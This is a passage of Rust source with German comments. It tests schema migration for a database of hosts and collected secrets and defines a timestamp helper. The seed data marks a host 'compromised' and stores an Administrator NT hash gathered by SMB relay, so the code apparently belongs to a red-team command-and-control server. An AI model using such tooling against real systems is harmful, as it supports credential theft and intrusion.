        // Der UNIQUE-Index steht: ohne ihn kaeme der Upsert nicht durch.
        let indexe: i64 = db
            .conn
            .lock()
            .unwrap()
            .query_row(
                "SELECT count(*) FROM sqlite_master WHERE type='index' AND name='idx_secrets_identitaet'",
                [],
                |r| r.get(0),
            )
            .expect("index");
        assert_eq!(indexe, 1, "der UNIQUE-Index fehlt");

        std::fs::remove_file(&path).ok();
    }

    /// Eine Datenbank aus einer aelteren Version kennt die Spalten
    /// `sealed_master` und `sealed_password` nicht. `ALTER TABLE` traegt sie
    /// nach — die Zeilen, die schon davor da waren, tragen dort NULL. Der
    /// Leser muss das aushalten: sonst liefert die Liste einen 500, und der
    /// Server waere nach der Migration nicht benutzbar.
    #[test]
    fn eine_aeltere_datenbank_ohne_die_nachgezogenen_spalten_liefert_zeilen() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-secret-alt-schema-{}.db", uuid::Uuid::new_v4()));

        {
            let conn = Connection::open(&path).expect("conn");
            conn.execute_batch(
                "CREATE TABLE IF NOT EXISTS hosts (
                    id TEXT PRIMARY KEY, ip TEXT, hostname TEXT, os TEXT,
                    status TEXT, first_seen TEXT, last_seen TEXT
                );
                CREATE TABLE IF NOT EXISTS secrets (
                    id TEXT PRIMARY KEY, host_id TEXT, cred_type TEXT,
                    username TEXT, password TEXT, source TEXT, collected_at TEXT
                );
                INSERT INTO hosts (id, ip, hostname, os, status, first_seen, last_seen)
                    VALUES ('10.0.0.5','10.0.0.5','ziel','Linux','compromised',
                        '2026-11-11T00:00:00Z','2026-11-11T00:00:00Z');
                INSERT INTO secrets (id, host_id, cred_type, username, password, source,
                    collected_at)
                    VALUES ('alt-1','10.0.0.5','nt_hash','Administrator','','smb_relay',
                        '2026-11-11T00:00:00Z');",
            )
            .expect("seed");
        }

        let db = Db::open(&path).expect("db");

        let hosts = db.list_hosts().expect("hosts");
        assert_eq!(hosts.len(), 1);
        assert_eq!(hosts[0].sealed_master, "");

        let secrets = db.list_secrets().expect("secrets");
        assert_eq!(secrets.len(), 1);
        assert_eq!(secrets[0].id, "alt-1");
        assert_eq!(secrets[0].sealed_password, "");

        std::fs::remove_file(&path).ok();
    }
}

// ── Der Zeitstempel ──────────────────────────────────────────────────────
//
// Der Server speichert genau diese Form, damit Journal, Konsole und Audit-Log
// identische Strings nutzen. Sie stand im Kern, obwohl nur der Server sie
// braucht: der Kern soll keine Datumslibrary mitschleppen, die niemand liest.

/// Zeitstempel im RFC-3339-Format (Sekunden, UTC). Der Server speichert genau
/// diese Form, damit Journal, Konsole und Audit-Log identische Strings nutzen.
fn now_rfc3339() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    rfc3339_utc(secs)
}

/// Sekunden -> RFC 3339 in UTC. Handgerechnet, weil diese Notiz ohne
/// Zeitcrates auskommen muss (Agent-Binaer soll klein und pruefbar bleiben).
fn rfc3339_utc(secs: i64) -> String {
    let (days, day_secs) = div_mod_i64(secs, 86_400);
    let (y, m, d) = civil_from_days(days);
    let hh = day_secs / 3600;
    let mm = (day_secs % 3600) / 60;
    let ss = day_secs % 60;
    format!("{y:04}-{m:02}-{d:02}T{hh:02}:{mm:02}:{ss:02}Z")
}

fn div_mod_i64(a: i64, b: i64) -> (i64, i64) {
    let q = a.div_euclid(b);
    (q, a.rem_euclid(b))
}

/// Howard Hinnant's civil_from_days (public domain).
fn civil_from_days(z: i64) -> (i64, u32, u32) {
    let z = z + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = (doy - (153 * mp + 2) / 5 + 1) as u32;
    let m = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
    (if m <= 2 { y + 1 } else { y }, m, d)
}
